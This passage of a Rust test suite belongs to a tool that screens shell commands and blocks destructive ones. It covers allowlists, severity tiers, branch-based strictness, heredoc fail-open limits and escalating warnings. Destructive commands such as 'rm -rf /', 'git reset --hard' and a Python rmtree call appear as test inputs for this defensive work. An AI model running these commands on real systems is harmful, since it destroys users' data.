                result.is_denied(),
                "Generous deadline should still deny destructive commands"
            );
            assert!(!result.skipped_due_to_budget);
        }
    }

    #[test]
    fn integration_allowlist_file_overrides_deny() {
        let config = default_config();
        let compiled = default_compiled_overrides();

        let tmp = std::env::temp_dir();
        let unique = COUNTER.fetch_add(1, Ordering::Relaxed);
        let path = tmp.join(format!(
            "dcg_allowlist_test_{}_{}.toml",
            std::process::id(),
            unique
        ));

        let toml = r#"
            [[allow]]
            rule = "core.git:reset-hard"
            reason = "integration test"
        "#;
        std::fs::write(&path, toml).expect("write allowlist file");

        let allowlists = LayeredAllowlist::load_from_paths(Some(path), None, None);

        let result = evaluate_command(
            "git reset --hard",
            &config,
            &["git"],
            &compiled,
            &allowlists,
        );
        assert!(result.is_allowed());
        assert!(result.allowlist_override.is_some());
    }

    // =========================================================================
    // Confidence Tiering Tests (git_safety_guard-oien.2.2)
    // =========================================================================
    //
    // These tests verify that Medium/Low severity patterns are evaluated (not skipped)
    // and the evaluator returns Deny results that the policy layer can convert to Warn/Log.

    #[test]
    fn medium_severity_patterns_are_evaluated() {
        // Test that Medium severity patterns are matched and return Deny results.
        // The policy layer in main.rs will convert these to Warn mode.
        let mut config = default_config();
        config.packs.enabled.push("containers.docker".to_string());
        let compiled = config.overrides.compile();
        let allowlists = default_allowlists();

        // docker image prune is a Medium severity pattern
        let result = evaluate_command(
            "docker image prune",
            &config,
            &["docker"],
            &compiled,
            &allowlists,
        );

        // Evaluator should return Deny (policy layer converts to Warn)
        assert!(
            result.is_denied(),
            "Medium severity pattern should be evaluated and return Deny"
        );

        // Verify severity is Medium
        let info = result
            .pattern_info
            .as_ref()
            .expect("should have pattern info");
        assert_eq!(
            info.severity,
            Some(crate::packs::Severity::Medium),
            "Pattern should have Medium severity"
        );
        assert_eq!(info.pack_id.as_deref(), Some("containers.docker"));
        assert_eq!(info.pattern_name.as_deref(), Some("image-prune"));
    }

    #[test]
    fn medium_severity_git_patterns_are_evaluated() {
        // Test git branch -D and stash drop (both Medium severity)
        let config = default_config();
        let compiled = config.overrides.compile();
        let allowlists = default_allowlists();

        // git branch -D is Medium severity
        let branch_result = evaluate_command(
            "git branch -D feature-branch",
            &config,
            &["git"],
            &compiled,
            &allowlists,
        );
        assert!(
            branch_result.is_denied(),
            "git branch -D should be evaluated"
        );
        let branch_info = branch_result.pattern_info.as_ref().unwrap();
        assert_eq!(branch_info.severity, Some(crate::packs::Severity::Medium));
        assert_eq!(
            branch_info.pattern_name.as_deref(),
            Some("branch-force-delete")
        );

        // git stash drop is Medium severity
        let stash_result = evaluate_command(
            "git stash drop stash@{0}",
            &config,
            &["git"],
            &compiled,
            &allowlists,
        );
        assert!(
            stash_result.is_denied(),
            "git stash drop should be evaluated"
        );
        let stash_info = stash_result.pattern_info.as_ref().unwrap();
        assert_eq!(stash_info.severity, Some(crate::packs::Severity::Medium));
        assert_eq!(stash_info.pattern_name.as_deref(), Some("stash-drop"));
    }

    #[test]
    fn critical_patterns_still_return_critical_severity() {
        // Ensure Critical patterns are unchanged
        let config = default_config();
        let compiled = config.overrides.compile();
        let allowlists = default_allowlists();

        // git reset --hard is Critical
        let result = evaluate_command(
            "git reset --hard",
            &config,
            &["git"],
            &compiled,
            &allowlists,
        );
        assert!(result.is_denied());
        let info = result.pattern_info.as_ref().unwrap();
        assert_eq!(
            info.severity,
            Some(crate::packs::Severity::Critical),
            "git reset --hard should remain Critical severity"
        );

        // git stash clear is Critical (vs stash drop which is Medium)
        let clear_result =
            evaluate_command("git stash clear", &config, &["git"], &compiled, &allowlists);
        assert!(clear_result.is_denied());
        let clear_info = clear_result.pattern_info.as_ref().unwrap();
        assert_eq!(
            clear_info.severity,
            Some(crate::packs::Severity::Critical),
            "git stash clear should remain Critical severity"
        );
    }

    #[test]
    fn policy_converts_medium_to_warn_mode() {
        // Test the policy layer correctly converts Medium severity to Warn mode.
        // This simulates what main.rs does after receiving the evaluation result.
        let policy = crate::config::PolicyConfig::default();

        // Medium severity should resolve to Warn mode
        let mode = policy.resolve_mode(
            Some("containers.docker"),
            Some("image-prune"),
            Some(crate::packs::Severity::Medium),
        );
        assert_eq!(
            mode,
            crate::packs::DecisionMode::Warn,
            "Medium severity should default to Warn mode"
        );

        // Critical severity should resolve to Deny mode
        let critical_mode = policy.resolve_mode(
            Some("core.git"),
            Some("reset-hard"),
            Some(crate::packs::Severity::Critical),
        );
        assert_eq!(
            critical_mode,
            crate::packs::DecisionMode::Deny,
            "Critical severity should always be Deny mode"
        );
    }

    // =========================================================================
    // UTF-8 Safe Windowing Tests (git_safety_guard-jpfm.2)
    // =========================================================================

    #[test]
    fn window_command_short_command_unchanged() {
        let cmd = "git reset --hard";
        let span = MatchSpan { start: 0, end: 16 };
        let result = window_command(cmd, &span, 80);

        assert_eq!(result.display, cmd);
        assert!(result.adjusted_span.is_some());
        let adj = result.adjusted_span.unwrap();
        assert_eq!(adj.start, 0);
        assert_eq!(adj.end, 16);
    }

    #[test]
    fn window_command_long_command_with_ellipsis() {
        // Create a long command with match in the middle
        let prefix = "a".repeat(50);
        let suffix = "b".repeat(50);
        let match_text = "git reset --hard";
        let cmd = format!("{prefix}{match_text}{suffix}");
        let span = MatchSpan {
            start: 50,
            end: 50 + 16,
        };

        let result = window_command(&cmd, &span, 40);

        // Should have ellipsis on both sides
        assert!(result.display.starts_with("..."));
        assert!(result.display.ends_with("..."));
        assert!(result.display.contains("git reset --hard"));

        // Adjusted span should point to the match within the windowed string
        let adj = result.adjusted_span.expect("Should have adjusted span");
        let windowed_match: String = result
            .display
            .chars()
            .skip(adj.start)
            .take(adj.end - adj.start)
            .collect();
        assert_eq!(windowed_match, "git reset --hard");
    }

    #[test]
    fn window_command_match_at_start() {
        let match_text = "rm -rf /";
        let suffix = "x".repeat(100);
        let cmd = format!("{match_text}{suffix}");
        let span = MatchSpan { start: 0, end: 8 };

        let result = window_command(&cmd, &span, 40);

        // Should NOT have left ellipsis, but should have right
        assert!(!result.display.starts_with("..."));
        assert!(result.display.ends_with("..."));
        assert!(result.display.contains("rm -rf /"));

        let adj = result.adjusted_span.expect("Should have adjusted span");
        assert_eq!(adj.start, 0);
    }

    #[test]
    fn window_command_match_at_end() {
        let prefix = "y".repeat(100);
        let match_text = "rm -rf /";
        let cmd = format!("{prefix}{match_text}");
        let span = MatchSpan {
            start: 100,
            end: 108,
        };

        let result = window_command(&cmd, &span, 40);

        // Should have left ellipsis, but NOT right
        assert!(result.display.starts_with("..."));
        assert!(!result.display.ends_with("..."));
        assert!(result.display.contains("rm -rf /"));
    }

    #[test]
    fn window_command_utf8_multibyte_chars() {
        // Test with UTF-8 multibyte characters (emoji)
        let cmd = "echo 🎉🎊🎈 && rm -rf / && echo done";
        // "rm -rf /" starts at byte position after "echo 🎉🎊🎈 && "
        // Each emoji is 4 bytes, so: "echo " (5) + 3*4 (12) + " && " (4) = 21 bytes
        let span = MatchSpan { start: 21, end: 29 }; // "rm -rf /"

        let result = window_command(cmd, &span, 50);

        assert!(result.display.contains("rm -rf /"));
        assert!(result.adjusted_span.is_some());
    }

    #[test]
    fn window_command_invalid_span_handles_gracefully() {
        let cmd = "short";
        let span = MatchSpan {
            start: 100,
            end: 200,
        }; // Way past end

        let result = window_command(cmd, &span, 80);

        // Should return full command but no span
        assert_eq!(result.display, "short");
        assert!(result.adjusted_span.is_none());
    }

    // =============================================================================
    // Git branch-aware strictness tests
    // =============================================================================

    mod branch_strictness_tests {
        use super::*;
        use crate::config::{GitAwarenessConfig, StrictnessLevel};
        use crate::packs::Severity;
        use std::path::Path;
        use std::process::Command;

        fn config_with_git_awareness(enabled: bool) -> Config {
            let mut config = Config::default();
            config.git_awareness.enabled = enabled;
            config
        }

        fn create_deny_result_with_severity(severity: Severity) -> EvaluationResult {
            EvaluationResult {
                decision: EvaluationDecision::Deny,
                pattern_info: Some(PatternMatch {
                    pack_id: Some("test.pack".to_string()),
                    pattern_name: Some("test_pattern".to_string()),
                    severity: Some(severity),
                    reason: "Test reason".to_string(),
                    source: MatchSource::Pack,
                    matched_span: None,
                    matched_text_preview: None,
                    explanation: None,
                    suggestions: &[],
                }),
                allowlist_override: None,
                effective_mode: Some(crate::packs::DecisionMode::Deny),
                skipped_due_to_budget: false,
                branch_context: None,
                session_occurrence: None,
                graduated_response: None,
                bypass_method: None,
            }
        }

        fn run_git(repo_path: &Path, args: &[&str]) {
            let output = Command::new("git")
                .current_dir(repo_path)
                .args(args)
                .output()
                .expect("failed to run git command");
            assert!(
                output.status.success(),
                "git {:?} failed: {}",
                args,
                String::from_utf8_lossy(&output.stderr)
            );
        }

        fn init_git_repo(repo_path: &Path, branch: &str) {
            run_git(repo_path, &["init"]);
            run_git(
                repo_path,
                &["config", "user.email", "dcg-tests@example.com"],
            );
            run_git(repo_path, &["config", "user.name", "DCG Tests"]);
            run_git(repo_path, &["checkout", "-b", branch]);
        }

        fn init_git_repo_detached(repo_path: &Path) {
            init_git_repo(repo_path, "main");
            // Need at least one commit to detach a HEAD that points anywhere.
            std::fs::write(repo_path.join("seed"), "seed").expect("seed file");
            run_git(repo_path, &["add", "seed"]);
            run_git(repo_path, &["commit", "-m", "seed"]);
            run_git(repo_path, &["checkout", "--detach", "HEAD"]);
        }

        #[test]
        fn disabled_git_awareness_returns_unchanged_result() {
            let config = config_with_git_awareness(false);
            let result = create_deny_result_with_severity(Severity::High);

            let modified = apply_branch_strictness(result, &config, None);

            // Decision should remain Deny
            assert_eq!(modified.decision, EvaluationDecision::Deny);
            // No branch context should be set
            assert!(modified.branch_context.is_none());
        }

        #[test]
        fn strictness_level_should_block_checks_critical() {
            assert!(StrictnessLevel::Critical.should_block(Severity::Critical));
            assert!(!StrictnessLevel::Critical.should_block(Severity::High));
            assert!(!StrictnessLevel::Critical.should_block(Severity::Medium));
            assert!(!StrictnessLevel::Critical.should_block(Severity::Low));
        }

        #[test]
        fn strictness_level_should_block_checks_high() {
            assert!(StrictnessLevel::High.should_block(Severity::Critical));
            assert!(StrictnessLevel::High.should_block(Severity::High));
            assert!(!StrictnessLevel::High.should_block(Severity::Medium));
            assert!(!StrictnessLevel::High.should_block(Severity::Low));
        }

        #[test]
        fn strictness_level_should_block_checks_medium() {
            assert!(StrictnessLevel::Medium.should_block(Severity::Critical));
            assert!(StrictnessLevel::Medium.should_block(Severity::High));
            assert!(StrictnessLevel::Medium.should_block(Severity::Medium));
            assert!(!StrictnessLevel::Medium.should_block(Severity::Low));
        }

        #[test]
        fn strictness_level_should_block_checks_all() {
            assert!(StrictnessLevel::All.should_block(Severity::Critical));
            assert!(StrictnessLevel::All.should_block(Severity::High));
            assert!(StrictnessLevel::All.should_block(Severity::Medium));
            assert!(StrictnessLevel::All.should_block(Severity::Low));
        }

        #[test]
        fn git_awareness_config_is_protected_branch() {
            let config = GitAwarenessConfig {
                enabled: true,
                protected_branches: vec!["main".to_string(), "master".to_string()],
                protected_strictness: StrictnessLevel::All,
                relaxed_branches: vec![],
                relaxed_strictness: StrictnessLevel::Critical,
                default_strictness: StrictnessLevel::High,
                detached_head_strictness: StrictnessLevel::All,
                relaxed_disabled_packs: vec![],
                show_branch_in_output: true,
                warn_if_not_git: false,
            };

            assert!(config.is_protected_branch(Some("main")));
            assert!(config.is_protected_branch(Some("master")));
            assert!(!config.is_protected_branch(Some("feature/test")));
            assert!(!config.is_protected_branch(None));
        }

        #[test]
        fn git_awareness_config_is_relaxed_branch_with_glob() {
            let config = GitAwarenessConfig {
                enabled: true,
                protected_branches: vec![],
                protected_strictness: StrictnessLevel::All,
                relaxed_branches: vec!["feature/*".to_string(), "experiment/*".to_string()],
                relaxed_strictness: StrictnessLevel::Critical,
                default_strictness: StrictnessLevel::High,
                detached_head_strictness: StrictnessLevel::All,
                relaxed_disabled_packs: vec![],
                show_branch_in_output: true,
                warn_if_not_git: false,
            };

            assert!(config.is_relaxed_branch(Some("feature/my-feature")));
            assert!(config.is_relaxed_branch(Some("experiment/test")));
            assert!(!config.is_relaxed_branch(Some("main")));
            assert!(!config.is_relaxed_branch(None));
        }

        #[test]
        fn git_awareness_config_strictness_for_branch() {
            let config = GitAwarenessConfig {
                enabled: true,
                protected_branches: vec!["main".to_string()],
                protected_strictness: StrictnessLevel::All,
                relaxed_branches: vec!["feature/*".to_string()],
                relaxed_strictness: StrictnessLevel::Critical,
                default_strictness: StrictnessLevel::High,
                detached_head_strictness: StrictnessLevel::All,
                relaxed_disabled_packs: vec![],
                show_branch_in_output: true,
                warn_if_not_git: false,
            };

            // Protected branch gets protected strictness
            assert_eq!(
                config.strictness_for_branch(Some("main")),
                StrictnessLevel::All
            );
            // Relaxed branch gets relaxed strictness
            assert_eq!(
                config.strictness_for_branch(Some("feature/test")),
                StrictnessLevel::Critical
            );
            // Other branch gets default strictness
            assert_eq!(
                config.strictness_for_branch(Some("develop")),
                StrictnessLevel::High
            );
            // No branch gets default strictness
            assert_eq!(config.strictness_for_branch(None), StrictnessLevel::High);
        }

        #[test]
        fn git_awareness_not_in_repo_uses_default_strictness() {
            // When not in a git repo, evaluation should use default strictness
            // and not panic or error. This tests graceful degradation.
            let mut config = Config::default();
            config.git_awareness.enabled = true;
            config.git_awareness.warn_if_not_git = false; // Don't emit warning in tests

            // Create a result that would normally be blocked
            let result = EvaluationResult {
                decision: EvaluationDecision::Deny,
                pattern_info: Some(PatternMatch {
                    reason: "test reason".to_string(),
                    pattern_name: Some("test-pattern".to_string()),
                    pack_id: Some("test.pack".to_string()),
                    severity: Some(crate::packs::Severity::High),
                    source: MatchSource::Pack,
                    matched_span: None,
                    matched_text_preview: None,
                    explanation: None,
                    suggestions: &[],
                }),
                allowlist_override: None,
                branch_context: None,
                effective_mode: None,
                skipped_due_to_budget: false,
                session_occurrence: None,
                graduated_response: None,
                bypass_method: None,
            };

            // Applying branch strictness at a non-git path should return unchanged result
            let temp_dir = std::env::temp_dir();
            // Create a unique subdir that is definitely not a git repo
            let unique_dir = temp_dir.join(format!("dcg_test_{}", std::process::id()));
            let _ = std::fs::create_dir_all(&unique_dir);

            // Apply branch strictness at the temp path (not a git repo)
            let modified_result =
                apply_branch_strictness(result.clone(), &config, Some(unique_dir.as_path()));

            // Result should be unchanged when not in a git repo (graceful degradation)
            assert_eq!(modified_result.decision, result.decision);
            assert!(
                modified_result.branch_context.is_none(),
                "Branch context should be None when not in a git repo"
            );

            // Clean up
            let _ = std::fs::remove_dir(&unique_dir);
        }

        #[test]
        fn git_awareness_warn_if_not_git_config() {
            // Test that the warn_if_not_git config option exists and can be set
            let mut config = Config::default();

            // Default should be false
            assert!(
                !config.git_awareness.warn_if_not_git,
                "warn_if_not_git should default to false"
            );

            // Should be settable
            config.git_awareness.warn_if_not_git = true;
            assert!(config.git_awareness.warn_if_not_git);
        }

        #[test]
        fn relaxed_branch_can_downgrade_deny_to_allow() {
            let temp = tempfile::tempdir().expect("tempdir");
            init_git_repo(temp.path(), "feature/relaxed");

            let mut config = Config::default();
            config.git_awareness.enabled = true;
            config.git_awareness.protected_branches = vec!["main".to_string()];
            config.git_awareness.protected_strictness = StrictnessLevel::All;
            config.git_awareness.relaxed_branches = vec!["feature/*".to_string()];
            config.git_awareness.relaxed_strictness = StrictnessLevel::Critical;
            config.git_awareness.default_strictness = StrictnessLevel::High;
            config.git_awareness.warn_if_not_git = false;

            let result = create_deny_result_with_severity(Severity::Low);
            let modified = apply_branch_strictness(result, &config, Some(temp.path()));

            assert_eq!(modified.decision, EvaluationDecision::Allow);

            let branch_context = modified
                .branch_context
                .expect("branch context should be populated");
            assert_eq!(
                branch_context.branch_name.as_deref(),
                Some("feature/relaxed")
            );
            assert!(!branch_context.is_protected);
            assert!(branch_context.is_relaxed);
            assert_eq!(branch_context.strictness, StrictnessLevel::Critical);
            assert!(branch_context.affected_decision);
        }

        #[test]
        fn protected_branch_keeps_deny_for_blocked_severity() {
            let temp = tempfile::tempdir().expect("tempdir");
            init_git_repo(temp.path(), "main");

            let mut config = Config::default();
            config.git_awareness.enabled = true;
            config.git_awareness.protected_branches = vec!["main".to_string()];
            config.git_awareness.protected_strictness = StrictnessLevel::All;
            config.git_awareness.relaxed_branches = vec!["feature/*".to_string()];
            config.git_awareness.relaxed_strictness = StrictnessLevel::Critical;
            config.git_awareness.default_strictness = StrictnessLevel::High;
            config.git_awareness.warn_if_not_git = false;

            let result = create_deny_result_with_severity(Severity::High);
            let modified = apply_branch_strictness(result, &config, Some(temp.path()));

            assert_eq!(modified.decision, EvaluationDecision::Deny);

            let branch_context = modified
                .branch_context
                .expect("branch context should be populated");
            assert_eq!(branch_context.branch_name.as_deref(), Some("main"));
            assert!(branch_context.is_protected);
            assert!(!branch_context.is_relaxed);
            assert_eq!(branch_context.strictness, StrictnessLevel::All);
            assert!(!branch_context.affected_decision);
        }

        #[test]
        fn detached_head_uses_detached_head_strictness_not_default() {
            // Detached HEAD typically signals rebase / bisect / checkout-tag.
            // With detached_head_strictness=All and a Low-severity result,
            // the result must stay Deny (the strictest knob applies),
            // even though default_strictness=Critical would have allowed it.
            let temp = tempfile::tempdir().expect("tempdir");
            init_git_repo_detached(temp.path());

            let mut config = Config::default();
            config.git_awareness.enabled = true;
            config.git_awareness.protected_branches = vec!["main".to_string()];
            config.git_awareness.protected_strictness = StrictnessLevel::All;
            config.git_awareness.relaxed_branches = vec!["feature/*".to_string()];
            config.git_awareness.relaxed_strictness = StrictnessLevel::Critical;
            // default_strictness is Critical (would NOT block Low) — proves
            // detached_head_strictness overrides default, not the other way.
            config.git_awareness.default_strictness = StrictnessLevel::Critical;
            config.git_awareness.detached_head_strictness = StrictnessLevel::All;
            config.git_awareness.warn_if_not_git = false;

            let result = create_deny_result_with_severity(Severity::Low);
            let modified = apply_branch_strictness(result, &config, Some(temp.path()));

            // Decision stays Deny because detached_head_strictness=All blocks Low.
            assert_eq!(modified.decision, EvaluationDecision::Deny);
            let branch_context = modified
                .branch_context
                .expect("branch context should be populated");
            assert!(branch_context.branch_name.is_none());
            assert!(!branch_context.is_protected);
            assert!(!branch_context.is_relaxed);
            assert_eq!(branch_context.strictness, StrictnessLevel::All);
        }

        #[test]
        fn detached_head_can_be_set_to_default_strictness() {
            // Opt-out: setting detached_head_strictness equal to
            // default_strictness restores the previous (loose) behavior.
            let temp = tempfile::tempdir().expect("tempdir");
            init_git_repo_detached(temp.path());

            let mut config = Config::default();
            config.git_awareness.enabled = true;
            config.git_awareness.default_strictness = StrictnessLevel::Critical;
            config.git_awareness.detached_head_strictness = StrictnessLevel::Critical;
            config.git_awareness.warn_if_not_git = false;

            let result = create_deny_result_with_severity(Severity::Low);
            let modified = apply_branch_strictness(result, &config, Some(temp.path()));

            // Critical strictness lets Low through.
            assert_eq!(modified.decision, EvaluationDecision::Allow);
            let branch_context = modified
                .branch_context
                .expect("branch context should be populated");
            assert_eq!(branch_context.strictness, StrictnessLevel::Critical);
            assert!(branch_context.affected_decision);
        }

        #[test]
        fn detached_head_strictness_defaults_to_all() {
            let cfg = Config::default();
            assert_eq!(
                cfg.git_awareness.detached_head_strictness,
                StrictnessLevel::All,
                "detached HEAD must default to the strictest level"
            );
        }
    }

    mod heredoc_fail_open {
        use super::*;

        fn heredoc_config(
            fallback_on_parse_error: bool,
            fallback_on_timeout: bool,
        ) -> crate::config::HeredocSettings {
            crate::config::HeredocSettings {
                enabled: true,
                fallback_on_parse_error,
                fallback_on_timeout,
                limits: crate::heredoc::ExtractionLimits::default(),
                allowed_languages: None,
                content_allowlist: None,
            }
        }

        fn heredoc_config_with_limits(
            limits: crate::heredoc::ExtractionLimits,
        ) -> crate::config::HeredocSettings {
            crate::config::HeredocSettings {
                enabled: true,
                fallback_on_parse_error: true,
                fallback_on_timeout: true,
                limits,
                allowed_languages: None,
                content_allowlist: None,
            }
        }

        fn eval_with_heredoc(
            command: &str,
            settings: &crate::config::HeredocSettings,
        ) -> EvaluationResult {
            let config = default_config();
            let enabled_packs = config.enabled_pack_ids();
            let ordered_packs = crate::packs::REGISTRY.expand_enabled_ordered(&enabled_packs);
            let enabled_keywords = crate::packs::REGISTRY.collect_enabled_keywords(&enabled_packs);
            let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
            let compiled = default_compiled_overrides();
            let allowlists = default_allowlists();

            evaluate_command_with_pack_order(
                command,
                enabled_keywords.as_slice(),
                ordered_packs.as_slice(),
                keyword_index.as_ref(),
                &compiled,
                &allowlists,
                settings,
            )
        }

        #[test]
        fn unterminated_heredoc_allows_in_failopen_mode() {
            let settings = heredoc_config(true, true);
            let cmd = "python3 -c 'import shutil' << EOF\nsome content without closing";
            let result = eval_with_heredoc(cmd, &settings);
            assert!(
                result.is_allowed(),
                "unterminated heredoc should fail-open when fallback_on_parse_error=true"
            );
        }

        #[test]
        fn exceeded_size_limit_allows_in_failopen_mode() {
            let limits = crate::heredoc::ExtractionLimits {
                max_body_bytes: 10,
                max_body_lines: 10_000,
                max_heredocs: 10,
                timeout_ms: 50,
            };
            let settings = heredoc_config_with_limits(limits);
            let cmd = "bash -c 'echo test' << EOF\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nEOF";
            let result = eval_with_heredoc(cmd, &settings);
            assert!(
                result.is_allowed(),
                "exceeded size limit should fail-open with default settings"
            );
        }

        #[test]
        fn exceeded_line_limit_allows_in_failopen_mode() {
            let limits = crate::heredoc::ExtractionLimits {
                max_body_bytes: 1024 * 1024,
                max_body_lines: 1,
                max_heredocs: 10,
                timeout_ms: 50,
            };
            let settings = heredoc_config_with_limits(limits);
            let cmd = "bash -c 'echo test' << EOF\nline1\nline2\nline3\nEOF";
            let result = eval_with_heredoc(cmd, &settings);
            assert!(
                result.is_allowed(),
                "exceeded line limit should fail-open with default settings"
            );
        }

        #[test]
        fn exceeded_heredoc_limit_allows_in_failopen_mode() {
            let limits = crate::heredoc::ExtractionLimits {
                max_body_bytes: 1024 * 1024,
                max_body_lines: 10_000,
                max_heredocs: 0,
                timeout_ms: 50,
            };
            let settings = heredoc_config_with_limits(limits);
            let cmd = "bash -c 'echo test' << EOF\ncontent\nEOF";
            let result = eval_with_heredoc(cmd, &settings);
            assert!(
                result.is_allowed(),
                "exceeded heredoc limit should fail-open with default settings"
            );
        }

        #[test]
        fn binary_content_allows_in_failopen_mode() {
            let settings = heredoc_config(true, true);
            let cmd = "python3 -c '\x00\x01\x02\x03\x04\x05\x06\x07'";
            let result = eval_with_heredoc(cmd, &settings);
            assert!(
                result.is_allowed(),
                "binary content should fail-open with default settings"
            );
        }

        #[test]
        fn strict_parse_error_denies_on_unterminated_heredoc() {
            let settings = heredoc_config(false, true);
            let cmd = "cat << EOF\ncontent without closing delimiter";
            let result = eval_with_heredoc(cmd, &settings);
            assert!(
                result.is_denied(),
                "unterminated heredoc should deny when fallback_on_parse_error=false, \
                 got: {result:?}"
            );
        }

        #[test]
        fn strict_parse_error_denies_on_exceeded_size() {
            let mut settings = heredoc_config(false, true);
            settings.limits.max_body_bytes = 5;
            let cmd = "cat << EOF\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nEOF";
            let result = eval_with_heredoc(cmd, &settings);
            assert!(
                result.is_denied(),
                "exceeded size should deny when fallback_on_parse_error=false, \
                 got: {result:?}"
            );
        }

        #[test]
        fn heredoc_disabled_skips_all_extraction() {
            let settings = crate::config::HeredocSettings {
                enabled: false,
                ..Default::default()
            };
            let cmd = "python3 -c 'import shutil; shutil.rmtree(\"/tmp\")'";
            let result = eval_with_heredoc(cmd, &settings);
            assert!(
                result.is_allowed(),
                "with heredoc disabled, inline scripts should not be analyzed"
            );
        }

        #[test]
        fn safe_command_with_heredoc_trigger_still_allowed() {
            let settings = heredoc_config(true, true);
            let cmd = "python3 -c 'print(42)'";
            let result = eval_with_heredoc(cmd, &settings);
            assert!(
                result.is_allowed(),
                "safe heredoc content should be allowed"
            );
        }
    }

    mod graduation_tests {
        use super::*;
        use crate::config::{GraduationMode, ResponseConfig, SeverityOverrides};
        use crate::packs::Severity;

        fn enabled_config() -> ResponseConfig {
            ResponseConfig {
                enabled: true,
                ..ResponseConfig::default()
            }
        }

        #[test]
        fn disabled_config_returns_none() {
            let config = ResponseConfig::default(); // enabled = false
            let result = determine_graduated_response(5, Severity::High, &config);
            assert!(result.is_none());
        }

        #[test]
        fn disabled_mode_returns_none() {
            let mut config = enabled_config();
            config.mode = GraduationMode::Disabled;
            let result = determine_graduated_response(5, Severity::Medium, &config);
            assert!(result.is_none());
        }

        #[test]
        fn warning_only_always_warns() {
            let mut config = enabled_config();
            config.mode = GraduationMode::WarningOnly;
            for count in [1, 5, 100] {
                let result =
                    determine_graduated_response(count, Severity::Medium, &config).unwrap();
                assert!(
                    matches!(result, GraduatedResponse::Warning { .. }),
                    "WarningOnly should always warn, got {:?}",
                    result
                );
            }
        }

        #[test]
        fn paranoid_always_hard_blocks() {
            let mut config = enabled_config();
            config.mode = GraduationMode::Paranoid;
            let result = determine_graduated_response(1, Severity::Medium, &config).unwrap();
            assert!(matches!(result, GraduatedResponse::HardBlock { .. }));
        }

        #[test]
        fn standard_mode_progression() {
            let config = enabled_config();
            // session_warning_count=1, session_soft_block=2

            // count=1 -> Warning
            let r = determine_graduated_response(1, Severity::High, &config).unwrap();
            assert!(matches!(r, GraduatedResponse::Warning { occurrence: 1 }));

            // count=2 -> SoftBlock
            let r = determine_graduated_response(2, Severity::High, &config).unwrap();
            assert!(matches!(r, GraduatedResponse::SoftBlock { occurrence: 2 }));

            // count=5 -> SoftBlock (still)
            let r = determine_graduated_response(5, Severity::High, &config).unwrap();
            assert!(matches!(r, GraduatedResponse::SoftBlock { occurrence: 5 }));
        }

        #[test]
        fn strict_mode_immediate_soft_block() {
            let mut config = enabled_config();
            config.mode = GraduationMode::Strict;
            // count=1 -> SoftBlock (immediate)
            let r = determine_graduated_response(1, Severity::Medium, &config).unwrap();
            assert!(matches!(r, GraduatedResponse::SoftBlock { .. }));
            // count=session_soft_block -> HardBlock
            let r =
                determine_graduated_response(config.session_soft_block, Severity::Medium, &config)
                    .unwrap();
            assert!(matches!(r, GraduatedResponse::HardBlock { .. }));
        }

        #[test]
        fn lenient_mode_doubles_thresholds() {
            let mut config = enabled_config();
            config.mode = GraduationMode::Lenient;
            // Default: session_warning_count=1, session_soft_block=2
            // Lenient doubles: warn at 2, soft_block at 4

            // count=1 -> None (below doubled warning threshold)
            let r = determine_graduated_response(1, Severity::Medium, &config);
            assert!(r.is_none());

            // count=2 -> Warning
            let r = determine_graduated_response(2, Severity::Medium, &config).unwrap();
            assert!(matches!(r, GraduatedResponse::Warning { .. }));

            // count=4 -> SoftBlock
            let r = determine_graduated_response(4, Severity::Medium, &config).unwrap();
            assert!(matches!(r, GraduatedResponse::SoftBlock { .. }));
        }

        #[test]
        fn severity_defaults_for_critical_and_low() {
            let config = enabled_config();
            // Critical defaults to Paranoid -> HardBlock
            let r = determine_graduated_response(1, Severity::Critical, &config).unwrap();
            assert!(matches!(r, GraduatedResponse::HardBlock { .. }));
            // Low defaults to WarningOnly -> Warning
            let r = determine_graduated_response(1, Severity::Low, &config).unwrap();
            assert!(matches!(r, GraduatedResponse::Warning { .. }));
        }

        #[test]
        fn severity_override_takes_precedence() {
            let mut config = enabled_config();
            config.severity_overrides = SeverityOverrides {
                critical: Some(GraduationMode::WarningOnly),
                high: None,
                medium: None,
                low: Some(GraduationMode::Paranoid),
            };
            // Critical overridden to WarningOnly
            let r = determine_graduated_response(1, Severity::Critical, &config).unwrap();
            assert!(matches!(r, GraduatedResponse::Warning { .. }));
            // Low overridden to Paranoid
            let r = determine_graduated_response(1, Severity::Low, &config).unwrap();
            assert!(matches!(r, GraduatedResponse::HardBlock { .. }));
        }

        #[test]
        fn apply_graduation_on_denied_result() {
            let mut config = enabled_config();
            config.session_warning_count = 1;
            let mut result = EvaluationResult::denied_by_pack_pattern(
                "core.git",
                "reset-hard",
                "Destroys uncommitted changes",
                None,
                Severity::High,
                &[],
            );
            result.session_occurrence = Some(crate::session::OccurrenceSnapshot {
                command_hash: "abc".to_string(),
                session_count: 1,
                distinct_commands: 1,
                total_occurrences: 1,
            });
            result.apply_graduation(&config);
            assert!(result.graduated_response.is_some());
            assert!(matches!(
                result.graduated_response,
                Some(GraduatedResponse::Warning { occurrence: 1 })
            ));
        }

        #[test]
        fn apply_graduation_skipped_when_disabled() {
            let config = ResponseConfig::default(); // enabled=false
            let mut result = EvaluationResult::denied_by_pack("test", "reason", None);
            result.session_occurrence = Some(crate::session::OccurrenceSnapshot {
                command_hash: "abc".to_string(),
                session_count: 5,
                distinct_commands: 1,
                total_occurrences: 5,
            });
            result.apply_graduation(&config);
            assert!(result.graduated_response.is_none());
        }

        #[test]
        fn apply_graduation_no_occurrence_data() {
            let config = enabled_config();
            let mut result = EvaluationResult::denied_by_pack("test", "reason", None);
            // No session_occurrence set
            result.apply_graduation(&config);
            assert!(result.graduated_response.is_none());
        }

        #[test]
        fn graduated_response_blocks() {
            assert!(!GraduatedResponse::Warning { occurrence: 1 }.blocks());
            assert!(GraduatedResponse::SoftBlock { occurrence: 2 }.blocks());
            assert!(
                GraduatedResponse::HardBlock {
                    total_occurrences: 5
                }
                .blocks()
            );
        }

        #[test]
        fn graduated_response_is_hard_block() {
            assert!(!GraduatedResponse::Warning { occurrence: 1 }.is_hard_block());
            assert!(!GraduatedResponse::SoftBlock { occurrence: 2 }.is_hard_block());
            assert!(
                GraduatedResponse::HardBlock {
                    total_occurrences: 5
                }
                .is_hard_block()
            );
        }

        #[test]
        fn graduated_response_labels() {
            assert_eq!(
                GraduatedResponse::Warning { occurrence: 3 }.label(),
                "warning (occurrence #3)"
            );
            assert_eq!(
                GraduatedResponse::SoftBlock { occurrence: 2 }.label(),
